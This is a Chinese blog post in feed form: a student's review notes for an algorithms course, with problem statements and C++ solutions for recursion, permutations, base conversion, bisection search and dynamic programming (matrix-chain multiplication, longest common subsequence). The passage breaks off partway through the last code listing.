    <published>2018-11-08T14:01:42.000Z</published>
    <updated>2019-11-10T12:19:30.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>对算法导论课的知识进行总结和考前复习~<a id="more"></a></p><h1 id="递归与分治"><a href="#递归与分治" class="headerlink" title="递归与分治"></a>递归与分治</h1><h2 id="递归过程摸索"><a href="#递归过程摸索" class="headerlink" title="递归过程摸索"></a><strong>递归过程摸索</strong></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"leval 1th-n"</span> &lt;&lt;<span class="string">" "</span>&lt;&lt;n &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> result = fun(n + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt; <span class="string">"leval 2th-n"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"leval 2th-result"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key = fun(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"main key"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; key &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="青蛙跳台阶"><a href="#青蛙跳台阶" class="headerlink" title="青蛙跳台阶"></a><strong>青蛙跳台阶</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</span><br><span class="line">所得到的结果模1000000007</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>斐波那契数列，此题递归时间太长，不推荐，最好的方法是迭代<br><strong>code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">fab</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> a = <span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> form1 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> form2 = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= num; i++)</span><br><span class="line">&#123;</span><br><span class="line">target=((form1%a)+(form2%a))%a;</span><br><span class="line">form1=form2;</span><br><span class="line">form2=target;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;fab(n)&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a><strong>排列问题</strong></h2><p><strong>题目描述</strong><br>要求输入一个字符串，输出他的全排列<br><strong>code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">list</span>[<span class="number">2000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> temp=a;</span><br><span class="line">a=b;</span><br><span class="line">b=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perm</span><span class="params">(<span class="keyword">int</span> k,<span class="keyword">int</span> m)</span><span class="comment">//输出list数组从k到m位的全排列</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">if</span>(k==m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)<span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">//递归到k=m为止结束递归</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">perm(k+<span class="number">1</span>,m);</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;<span class="built_in">list</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="built_in">list</span>);</span><br><span class="line">perm(<span class="number">0</span>,len<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="汽水瓶"><a href="#汽水瓶" class="headerlink" title="汽水瓶"></a><strong>汽水瓶</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bottle</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n&gt;=<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> form1=n/<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> form2=n%<span class="number">3</span>;</span><br><span class="line">n=form1+form2;</span><br><span class="line">count+=form1;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;N&amp;&amp;N!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ans=bottle(N);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a><strong>进制转换</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 输入一个十进制正整数，然后输出它所对应的八进制数。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">输入一个十进制正整数n(1≤n≤106) 。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">输出n对应的八进制数，输出在一行。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">10</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">form</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (num &lt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> num % <span class="number">8</span> + <span class="number">10</span> * form(num / <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">b = form(a);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a><strong>二分法</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">在金融中，我们有时会用内部收益率IRR来评价项目的投资财务效益，它等于使得投资净现值NPV等于0的贴现率。换句话说，给定项目的期数T、初始现金流CF0和项目各期的现金流CF1, CF2, ...，CFT，IRR是下面方程的解：</span><br><span class="line"></span><br><span class="line">为了简单起见，本题假定：除了项目启动时有一笔投入（即初始现金流CF0 &lt; 0）之外，其余各期均能赚钱（即对于所有i=1,2,...,T，CFi &gt; 0）。根据定义，IRR可以是负数，但不能大于-1。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入文件最多包含25组测试数据，每个数据占两行，第一行包含一个正整数T（1&lt;=T&lt;=10），表示项目的期数。第二行包含T+1个整数：CF0, CF1, CF2, ..., CFT，其中CF0 &lt; 0, 0 &lt; CFi &lt; 10000 (i=1,2,...,T)。T=0表示输入结束，你的程序不应当处理这一行。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。如果IRR不存在，输出&quot;No&quot;，如果有多个不同IRR满足条件，输出&quot;Too many&quot;（均不含引号）</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">-1 2</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">-8 6 9</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">1.00</span><br><span class="line"></span><br><span class="line">0.50</span><br></pre></td></tr></table></figure></p><p><strong>思路</strong><br>从无穷大到-1二分搜索答案</p><p><strong>code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t,i;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;t&amp;&amp;t!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">double</span> a[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=t;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">double</span> l,r,mid,x,ans;</span><br><span class="line">    ans=<span class="number">0.0</span>;</span><br><span class="line">        l=<span class="number">-1.0</span>;</span><br><span class="line">        r=<span class="number">1e6</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fabs</span>(a[<span class="number">0</span>]+ans)&gt;<span class="number">1e-7</span>)</span><br><span class="line">       &#123;</span><br><span class="line">    ans=<span class="number">0.0</span>;</span><br><span class="line">    x=<span class="number">1.0</span>;</span><br><span class="line">    mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=t;j++)</span><br><span class="line">    &#123;</span><br><span class="line">    x=x/(<span class="number">1</span>+mid);</span><br><span class="line">    ans+=a[j]*x;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>((ans+a[<span class="number">0</span>])&gt;<span class="number">0</span>)</span><br><span class="line">l=mid;</span><br><span class="line"><span class="keyword">else</span> r=mid;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;mid&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>最头疼的就是这一块，老师上课又飞快，虽然讲的非常好，但是还是有点跟不上节奏，加之老师根本不分析代码，所以自己考前准备自己动手复习一波。</p><p>动态规划解决问题的基本方法码一波<br>(1)找出最优解的性质并刻画其结构特征<br>(2)递归地定义最优值<br>(3)以自底向上的方式计算出最优值<br>(4)根据计算最优值时的信息构造最优解</p><h2 id="1-矩阵连乘问题"><a href="#1-矩阵连乘问题" class="headerlink" title="1.矩阵连乘问题"></a><strong>1.矩阵连乘问题</strong></h2><p>矩阵连乘的最优值是n个矩阵连乘的最小数乘次数，最优解是得出矩阵之间该如何进行优先级运算才能得出最优值（也就是加括号的方式）</p><p><strong>题目描述</strong><br>给定n个矩阵｛A1,A2,…,An｝，其中Ai与Ai+1是可乘的，i=1,2 ,…,n-1。如何确定计算矩阵连乘积的计算次序，使得依此次序计算矩阵连乘积需要的数乘次数最少。<br>A1={30x35} ; A2={35x15} ;A3={15x5} ;A4={5x10} ;A5={10x20} ;A6={20x25} ;<br>最后的结果为：((A1(A2A3))((A4A5)A6))  最小的乘次为15125<br><img src="https://s1.ax1x.com/2018/10/31/iWK9c6.png" alt="m[i][j]的递推方程"></p><p><strong>Code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100];     //m[i][j]表示A[i:j]的最小数乘次数 </span><br><span class="line">int s[100][100]=&#123;0&#125;;     //s[i][j]表示断点位置 </span><br><span class="line">int p[100];//表示矩阵的行列值 </span><br><span class="line">int matrixchain(int n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][i]=0;  //对角线赋值0 </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int r=2;r&lt;=n;r++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n-r+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">int j=i+r-1;     //从m[i][i+1]开始判断 i&lt;=j&lt;n</span><br><span class="line">m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];</span><br><span class="line">s[i][j]=i;       //此时从i处断开</span><br><span class="line"><span class="keyword">for</span>(int k=i+1;k&lt;j;k++)</span><br><span class="line">&#123;</span><br><span class="line">int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; //从i+1处断开并比较大小 </span><br><span class="line"><span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=t;         //更新最优值 </span><br><span class="line">s[i][j]=k;   //更新断点 </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> int N;</span><br><span class="line">cin&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;N+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;p[i];</span><br><span class="line"> &#125; </span><br><span class="line">matrixchain(N);</span><br><span class="line">cout&lt;&lt;m[1][N]&lt;&lt;endl;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="2-最长公共子序列"><a href="#2-最长公共子序列" class="headerlink" title="2.最长公共子序列"></a><strong>2.最长公共子序列</strong></h2><p><strong>题目描述</strong><br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 